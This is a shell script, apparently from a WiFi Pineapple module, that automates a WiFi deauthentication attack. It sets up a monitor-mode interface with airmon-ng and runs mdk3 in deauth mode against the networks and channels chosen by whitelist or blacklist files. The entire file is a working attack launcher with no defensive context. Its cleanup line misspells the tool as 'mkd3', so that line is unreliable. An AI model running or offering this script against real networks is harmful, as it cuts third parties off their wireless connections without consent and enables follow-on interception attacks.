#!/bin/sh

MYPATH="$(dirname $0)/"

CHANNELS=`cat ${MYPATH}infusion.conf | grep "channels" | awk -F\= '{print $2}'`
MYMONITOR=`cat ${MYPATH}infusion.conf | grep "monitor" | awk -F = '{print $2}'`
MYINTERFACE=`cat ${MYPATH}infusion.conf | grep "interface" | awk -F = '{print $2}'`
MYMODE=`cat ${MYPATH}infusion.conf | grep "mode" | awk -F\= '{print $2}'`

MYMAC=`ifconfig | grep ${MYINTERFACE} | grep -v ${MYMONITOR} | awk '{print $5}'`

LOG=${MYPATH}log
WHITELIST=${MYPATH}rules/whitelist.lst
TMPWHITELIST=${MYPATH}rules/whitelist.tmp
BLACKLIST=${MYPATH}rules/blacklist.lst
TMPBLACKLIST=${MYPATH}rules/blacklist.tmp

killall -9 mkd3
rm ${TMPBLACKLIST}
rm ${TMPWHITELIST}
rm ${LOG}

echo -e "Starting WiFi Deauth [mdk3]..." > ${LOG}

if [ -z "$MYINTERFACE" ]; then
	MYINTERFACE=`iwconfig 2> /dev/null | grep "Mode:Master" | awk '{print $1}' | sort | head -1`
else
	MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYINTERFACE}`
	
	if [ -z "$MYFLAG" ]; then
	    MYINTERFACE=`iwconfig 2> /dev/null | grep "Mode:Master" | awk '{print $1}' | sort | head -1`
	fi
fi

if [ -z "$MYMONITOR" ]; then
	MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1`
   
	MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYMONITOR}`
	
	if [ -z "$MYFLAG" ]; then
	    airmon-ng start ${MYINTERFACE}
	    MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1`
	fi
else
	MYFLAG=`iwconfig 2> /dev/null | awk '{print $1}' | grep ${MYMONITOR}`
	
	if [ -z "$MYFLAG" ]; then
	    airmon-ng start ${MYINTERFACE}
	    MYMONITOR=`iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1`
	fi
fi

grep -hv -e ^# ${WHITELIST} -e ^$ > ${TMPWHITELIST}
grep -hv -e ^# ${BLACKLIST} -e ^$ > ${TMPBLACKLIST}

echo -e "Interface : ${MYINTERFACE}" >> ${LOG}
echo -e "Monitor : ${MYMONITOR}" >> ${LOG}
echo -e "Mode : ${MYMODE}" >> ${LOG}
echo -e "Channels : ${CHANNELS}" >> ${LOG}

if [ ${MYMODE} == "whitelist" ]; then
  mdk3 ${MYMONITOR} d -w ${TMPWHITELIST} -c ${CHANNELS} 1>> ${LOG} 2>> ${LOG}
elif [ ${MYMODE} == "blacklist" ]; then
  mdk3 ${MYMONITOR} d -b ${TMPBLACKLIST} -c ${CHANNELS} 1>> ${LOG} 2>> ${LOG}
else
  echo "ERROR: Mode should be whitelist/blacklist.. Defaulting to whitelist..." >> ${LOG}
  mdk3 ${MYMONITOR} d -w ${TMPWHITELIST} -c ${CHANNELS} 1>> ${LOG} 2>> ${LOG}
fi
